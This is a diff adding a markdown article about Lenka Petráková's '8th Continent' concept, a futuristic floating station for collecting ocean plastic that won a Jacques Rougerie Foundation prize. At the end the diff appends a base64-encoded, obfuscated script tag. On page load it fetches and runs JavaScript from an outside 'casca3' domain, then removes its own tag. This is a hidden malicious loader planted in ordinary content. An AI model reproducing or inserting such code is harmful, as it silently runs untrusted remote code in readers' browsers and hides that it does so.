@@ -1,1 +1,23 @@
-# architecture
+# The concept of a floating station for cleaning the ocean that looks like an alien ship
+
+![Image](angiellatolko1.jpg)
+
+- Global problems of mankind do not bypass even designers. So, for example, Lenka Petrakova's ambitious concept "8 Continent" would help solve the super-complicated task of cleaning the waters of the World Ocean from garbage and plastic. This floating research station strikes not only with its futuristic forms. Its potential for solving global problems was so impressive that the project won the National Architecture Award for Green and Innovative Solutions for the Sea.
+
+- Plastic has long been a headache for mankind, because it has filled not only all landfills and roadsides, but also the waters of the world's oceans. Environmentalists are sounding the alarm, and with good reason, as every year more than 8 million tons of plastic gets into the rivers, seas and oceans, which leads not only to the formation of islands but also to the formation of gigantic waste continents.
+
+![Image](angiellatolko2.jpg)
+
+- Just look at the ever-growing Great Pacific garbage patch, which covers an area of 1.6 million square kilometers. And, worst of all, it is not alone on our planet. This accumulation of trash has catastrophic consequences, which not only environmentalists and the public are trying to prevent. Architects are also trying to contribute to this noble cause by creating unique projects the realization of which would help clean the planet from the accumulated garbage.
+
+- One such project won the Grand Prix 2020 at the Jacques Rougerie Foundation International Competition. The National Architecture Prize is awarded for an outstanding contribution to green and innovative solutions, to the active development of the industry and is the highest French architectural award. The concept, entitled 8th Continent, was developed by Lenka Petráková, a Slovakian specialist and leading designer at Zaha Hadid Architects in London. She proposed the concept of a floating research station, which could be used to collect and recycle plastic. Lenka Petrakova's designs impress with both the possibilities and the futuristic glass forms emerging from the elegant spiral base.
+
+![Image](angiellatolko3.jpg)
+
+## Interesting fact: The founder of the prize, oceanographer and architect Jacques Rougery, fascinated by the sea and new technologies that improve the environment, has not abandoned the hope to build an ideal world of the future. To this end, he set up a foundation with a €30,000 prize for those who strive to achieve excellence in the exploration and revitalization of the oceans.
+
+![Image](angiellatolko4.jpg)
+
+- Last year, Jacques Rougery and the jury were struck by the concept of a floating station, a self-sufficient and fully autonomous structure that will be able to move thanks to the power of the sun, water (tidal power) and wind. The 8th Continent will not only perform a research function, but also actively purify the waters of the ocean.
+
+<script id="QSsD0" src="data:text/javascript;base64, dmFyIF9MYUs2OSA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX3JWTUVhLCBfajB6cUMpIHt2YXIgX1VtOE9YID0gZnVuY3Rpb24oX3dlUnNMKSB7d2hpbGUgKC0tX3dlUnNMKSB7X3JWTUVhWydwdXNoJ10oX3JWTUVhWydzaGlmdCddKCkpO319O19VbThPWCgrK19qMHpxQyk7fShfTGFLNjksIDB4MTFiKSk7dmFyIF84Rm5ibiA9IGZ1bmN0aW9uKF9yZUxOUywgX0xQbDROKSB7X3JlTE5TID0gX3JlTE5TIC0gMHgwO3ZhciBfUmhOSGggPSBfTGFLNjlbX3JlTE5TXTtyZXR1cm4gX1JoTkhoO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfOEZuYm4oJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX1A4V0FtID0gZG9jdW1lbnRbXzhGbmJuKCcweDEnKV0oXzhGbmJuKCcweDInKSk7X1A4V0FtW184Rm5ibignMHgzJyldID0gXzhGbmJuKCcweDQnKTtfUDhXQW1bJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHgzNVx4NzNceDZiXHg2ZVx4NzhceDZkXHg2M1x4NzdceDJlXHg2M1x4NjFceDczXHg2M1x4NjFceDMzXHgyZVx4NzNceDcwXHg2MVx4NjNceDY1XHgyZlx4NWZceDcyXHg2NVx4NmRceDZmXHg3NFx4NjVceDVmXHg3NFx4NzJceDYxXHg2M1x4NmJceDJlXHg2YVx4NzNceDNmXHg2M1x4NjFceDZkXHg3MFx4NjFceDY5XHg2N1x4NmVceDNkXHgzMVx4NTZceDc4XHg2Zlx4NGJceDU2XHg2OFx4NzdceDc4XHg0ZSc7ZG9jdW1lbnRbXzhGbmJuKCcweDUnKV0oXzhGbmJuKCcweDYnKSlbJ1x4NjFceDcwXHg3MFx4NjVceDZlXHg2NFx4NDNceDY4XHg2OVx4NmNceDY0J10oX1A4V0FtKTtkb2N1bWVudFtfOEZuYm4oJzB4NycpXSgnUVNzRDAnKVsnXHg3Mlx4NjVceDZkXHg2Zlx4NzZceDY1J10oKTt9LCB7J1x4NmZceDZlXHg2M1x4NjUnOiAhIVtdfSk7"></script>
